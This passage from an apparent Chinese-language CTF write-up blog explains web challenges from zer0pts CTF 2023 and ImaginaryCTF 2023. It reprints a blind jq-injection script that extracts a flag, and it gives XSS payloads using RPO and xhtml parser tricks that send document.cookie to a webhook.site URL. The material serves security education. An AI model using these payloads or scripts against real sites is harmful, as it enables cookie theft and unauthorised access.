function">includes</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">)</span> <span class="token operator">||</span> str<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'\\('</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'hacking attempt detected'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        condsQuery <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">| select(.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> | contains("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"))</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> query <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">[.challenges[] </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>condsQuery<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> | &#123;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>keysQuery<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&#125;]</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'[+] keys:'</span><span class="token punctuation">,</span> keys<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'[+] conds:'</span><span class="token punctuation">,</span> conds<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span>    <span class="token keyword">let</span> result<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> <span class="token keyword">await</span> jq<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>query<span class="token punctuation">,</span> <span class="token string">'./data.json'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">output</span><span class="token operator">:</span> <span class="token string">'json'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>        <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'something wrong'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>conds<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'sorry, you cannot use filters in demo version'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>雖然說有擋雙引號但沒擋 <code>\</code>，因此只要兩個條件配合，就可以插入自己的 jq command，達成 command injection，用 <code>env.FLAG</code> 可以拿到 flag。</p><p>不過問題是不會把結果傳回來，所以是 blind injection，一個一個字元慢慢 leak 就行了，底下貼的是 <a href="https://blog.arkark.dev/2023/07/17/zer0pts-ctf/">zer0pts CTF 2023 writeup (4 web challs)</a> 的 exploit：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> httpx<span class="token keyword">import</span> string# <span class="token constant">BASE_URL</span> <span class="token operator">=</span> <span class="token string">"http://localhost:8300"</span><span class="token constant">BASE_URL</span> <span class="token operator">=</span> <span class="token string">"http://jqi.2023.zer0pts.com:8300"</span><span class="token constant">CHARS</span> <span class="token operator">=</span> <span class="token string">"&#125;_"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digitsdef <span class="token function">make_str</span><span class="token punctuation">(</span>xs<span class="token operator">:</span> str<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> str<span class="token operator">:</span>    <span class="token keyword">return</span> <span class="token string">"("</span> <span class="token operator">+</span> <span class="token string">"+"</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">[</span>f<span class="token string">"([&#123;ord(x)&#125;] | implode)"</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> xs<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span>def <span class="token function">is_ok</span><span class="token punctuation">(</span>prefix<span class="token operator">:</span> str<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> bool<span class="token operator">:</span>    res <span class="token operator">=</span> httpx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>        f<span class="token string">"&#123;BASE_URL&#125;/api/search"</span><span class="token punctuation">,</span>        params<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string-property property">"keys"</span><span class="token operator">:</span> <span class="token string">"name"</span><span class="token punctuation">,</span>            <span class="token string-property property">"conds"</span><span class="token operator">:</span> <span class="token string">","</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">[</span>                <span class="token string">"\\ in name"</span><span class="token punctuation">,</span>                f<span class="token string">"))] + [if (env.FLAG | startswith(&#123;make_str(prefix)&#125;)) then error(&#123;make_str('x')&#125;) else 0 end] # in name"</span>            <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"something wrong"</span>known <span class="token operator">=</span> <span class="token string">"zer0pts&#123;"</span><span class="token keyword">while</span> not known<span class="token punctuation">.</span><span class="token function">endswith</span><span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token constant">CHARS</span><span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token function">is_ok</span><span class="token punctuation">(</span>known <span class="token operator">+</span> c<span class="token punctuation">)</span><span class="token operator">:</span>            known <span class="token operator">+=</span> c            <span class="token keyword">break</span>    <span class="token function">print</span><span class="token punctuation">(</span>known<span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Flag: "</span> <span class="token operator">+</span> known<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="neko-note-26-solves">Neko Note (26 solves)</span></h3><p>又是一個經典 note app，核心程式碼如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> linkPattern <span class="token operator">=</span> regexp<span class="token punctuation">.</span><span class="token function">MustCompile</span><span class="token punctuation">(</span><span class="token string">`\[([0-9a-f]&#123;8&#125;-[0-9a-f]&#123;4&#125;-4[0-9a-f]&#123;3&#125;-[0-9a-f]&#123;4&#125;-[0-9a-f]&#123;12&#125;)\]`</span><span class="token punctuation">)</span><span class="token comment">// replace [(note ID)] to links</span><span class="token keyword">func</span> <span class="token function">replaceLinks</span><span class="token punctuation">(</span>note <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> linkPattern<span class="token punctuation">.</span><span class="token function">ReplaceAllStringFunc</span><span class="token punctuation">(</span>note<span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>s <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>    id <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Trim</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"[]"</span><span class="token punctuation">)</span>    note<span class="token punctuation">,</span> ok <span class="token operator">:=</span> notes<span class="token punctuation">[</span>id<span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token operator">!</span>ok <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> s    <span class="token punctuation">&#125;</span>    title <span class="token operator">:=</span> html<span class="token punctuation">.</span><span class="token function">EscapeString</span><span class="token punctuation">(</span>note<span class="token punctuation">.</span>Title<span class="token punctuation">)</span>    <span class="token keyword">return</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span>      <span class="token string">"&lt;a href=/note/%s title=%s>%s&lt;/a>"</span><span class="token punctuation">,</span> id<span class="token punctuation">,</span> title<span class="token punctuation">,</span> title<span class="token punctuation">,</span>    <span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// escape note to prevent XSS first, then replace newlines to &lt;br> and render links</span><span class="token keyword">func</span> <span class="token function">renderNote</span><span class="token punctuation">(</span>note <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>  note <span class="token operator">=</span> html<span class="token punctuation">.</span><span class="token function">EscapeString</span><span class="token punctuation">(</span>note<span class="token punctuation">)</span>  note <span class="token operator">=</span> strings<span class="token punctuation">.</span><span class="token function">ReplaceAll</span><span class="token punctuation">(</span>note<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">)</span>  note <span class="token operator">=</span> <span class="token function">replaceLinks</span><span class="token punctuation">(</span>note<span class="token punctuation">)</span>  <span class="token keyword">return</span> note<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>sanitized 之後會 replace link，這邊雖然也有 escaped，但因為屬性沒有用引號包住所以可以注入任意屬性到 a 裡面。</p><p>這邊用 <code>onanimationend</code> 或是 <code>onfocus</code> 似乎都可以觸發 XSS。</p><p>這邊觸發 XSS 以後還有個步驟，那就是要偷的東西被刪掉了，但可以用神奇的 <code>document.execCommand(&#39;undo&#39;);</code> 將其復原。</p><h3><span id="scoreshare-16-solves">ScoreShare (16 solves)</span></h3><p>這題的核心程式碼如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        title <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        abc <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        link <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'link'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> title<span class="token punctuation">:</span>            flask<span class="token punctuation">.</span>flash<span class="token punctuation">(</span><span class="token string">'Title is empty'</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token keyword">not</span> abc<span class="token punctuation">:</span>            flask<span class="token punctuation">.</span>flash<span class="token punctuation">(</span><span class="token string">'ABC notation is empty'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            sid <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hset<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'title'</span><span class="token punctuation">,</span> title<span class="token punctuation">)</span>            db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hset<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">,</span> abc<span class="token punctuation">)</span>            db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hset<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'link'</span><span class="token punctuation">,</span> link<span class="token punctuation">)</span>            <span class="token keyword">return</span> flask<span class="token punctuation">.</span>redirect<span class="token punctuation">(</span>flask<span class="token punctuation">.</span>url_for<span class="token punctuation">(</span><span class="token string">'score'</span><span class="token punctuation">,</span> sid<span class="token operator">=</span>sid<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">"upload.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/score/&lt;sid>"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">score</span><span class="token punctuation">(</span>sid<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Score viewer"""</span>    title <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hget<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'title'</span><span class="token punctuation">)</span>    link <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hget<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'link'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> link <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        flask<span class="token punctuation">.</span>flash<span class="token punctuation">(</span><span class="token string">"Score not found"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>redirect<span class="token punctuation">(</span>flask<span class="token punctuation">.</span>url_for<span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">"score.html"</span><span class="token punctuation">,</span> sid<span class="token operator">=</span>sid<span class="token punctuation">,</span> link<span class="token operator">=</span>link<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> title<span class="token operator">=</span>title<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/score/&lt;sid>"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">api_score</span><span class="token punctuation">(</span>sid<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    abc <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hget<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> abc <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>abc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>你可以新增一個 post 之類的，然後有個 unintended 是 <code>/api/score/&lt;sid&gt;</code> 這個 endpoint 會直接把 abc 整個吐出來，所以新增兩個，一個是 JS 內容，另一個是 <code>&lt;script src=...&gt;</code> 就可以直接 XSS 了。</p><p>預期解可以參考作者的文章：<a href="https://ptr-yudai.hatenablog.com/#ScoreShare">zer0pts CTF 2023 Writeup</a>，透過 iframe DOM clobbering 再搭配原有的功能達成 prototype pollution，然後找到 ABCJS 的 gadget。</p><h3><span id="ringtone-14-solves">Ringtone (14 solves)</span></h3><p>這題有點小複雜，簡單記一下就好，就是可以透過 DOM clobbering 拿到一個在 Chrome extension context 的 XSS，接著用 <code>chrome.history.search</code> 可以拿到 flag URL，就可以去拿 flag。</p><p>作者 writeup：<a href="https://ahmed-belkahla.me/post/zer0ptsctf2023/">Ringtone Web Challenge Writeup - Zer0pts CTF 2023</a></p><h3><span id="plain-blog-14-solves">Plain Blog (14 solves)</span></h3><p>這題是一個 blog app，你需要有拿 flag 的權限才能拿到 flag，而要有這個權限你的 post 必須有 1_000_000_000_000 以上的 like，但想也知道網站有擋 max like，根本湊不了這麼多。</p><p>解法是前端有個 prototype pollution 的洞，透過這個洞去污染 fetch 的參數，放入 <code>X-HTTP-Method-Override: PUT</code> 的 header，就可以讓 admin bot 直接去 call 另一隻 API 拿到權限。</p><h2><span id="imaginaryctf-2023">ImaginaryCTF 2023</span></h2><h3><span id="sanitized-5-solves">Sanitized (5 solves)</span></h3><p>這題的程式碼滿簡短的，值得注意的就是 CSP 為 <code>default-src &#39;self&#39;</code>，然後 Express 那邊有個路徑是：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Page </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>req<span class="token punctuation">.</span>path<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> not found</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>看得出來需要利用這個路徑的 response 作為 script 來執行。</p><p>在前端的部分就是很經典的呼叫 DOMPurify：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token keyword">const</span> html <span class="token operator">=</span> params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>html<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> html  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>index.xhtml</code> 裡面載入 main.js 時，是採用相對路徑：<code>&lt;script src=&quot;main.js&quot;&gt;&lt;/script&gt;</code>。</p><p>我們先來看一下 unintended 的解法，滿有趣的。</p><p>非預期解是直接讓 bot 載入這個路徑：<code>/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//asd%2f..%2f..%2findex.xhtml#https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?</code></p><p>這是利用了 RPO（Relative Path Overwrite）來搞事，對後端來說 <code>%2f</code> 會被解析為 &#x2F;，所以這個 URl 就是在載入 <code>index.xhtml</code>，沒啥問題。</p><p>但是對瀏覽器來說，當前的路徑變為 <code>1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//</code>，因此會載入 <code>/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//main.js</code>，而根據 Express 的 route，response 就會是：</p><pre class="line-numbers language-none"><code class="language-none">Page &#x2F;1;var[Page]&#x3D;[1];location&#x3D;location.hash.slice(1)+document.cookie&#x2F;&#x2F;main.js not found<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第一句 <code>Page/1</code> 因為第二句的 <code>var [Page]=[1]</code> 的 hoisting 所以不會發生 variable is not defined 的錯誤，而最後的 <code>main.js not found</code> 被前面的 <code>//</code> 弄成註解，因此最後就執行了中間那一段，偷到了 cookie。</p><p>這操作真的帥氣。</p><h3><span id="sanitized-revenge-3-solves">Sanitized Revenge (3 solves)</span></h3><p>這題把 unintended 修掉了，讓我們來看一下預期解。</p><p>首先這題最重要的一點在於網頁是 xhtml，而非 html，因此瀏覽器的解析方式會不同。</p><p>舉例來說，作者給的 payload：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span>    &lt;![CDATA[<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">data-x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>]]＞&lt;/style>&lt;iframe name='Page' />&lt;base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' />&lt;style>&lt;!--<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">--></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>會被 HTML parser 解析為 style tag + 一個含有 <code>data-x</code> 屬性的 div，所以 DOMPurify 不會做任何事情，這是沒問題的 HTML。</p><p>但由於現在在 xhtml 底下，因此 CDATA 那一段就變成了像是註解的東西，刪除後變成：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>Page<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>/**/+location.assign(document.all.url.textContent+document.cookie)//<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--">&lt;/div>&lt;style>--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>原本在屬性裡的 iframe 跟 base 就跑了出來。</p><p>這邊會需要 base 是因為一般來說碰到 <code>script-src &#39;self&#39;</code> 這種 CSP，第一直覺一定是 <code>&lt;iframe srcdoc&gt;</code> 搭配 script gadget 去繞，但這題因為 xhtml 的限制在屬性中不能有<code>&lt;</code>，所以要利用之後會載入的 <code>report.js</code> 搭配 base 去改變路徑。</p><p>在<a href="https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Sanitized%20Revenge">作者 writeup</a> 裡面還有給幾個其他人的解法，每個都滿有趣的。</p><p>第一個利用了 HTML 會忽略在 style 裡的 <code>&lt;!--</code> 但是 xhtml 不會來創造差異：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"><span class="token selector">a</span> <span class="token punctuation">&#123;</span> <span class="token property">color</span><span class="token punctuation">:</span> &lt;!--<span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-->&lt;/style>&lt;base 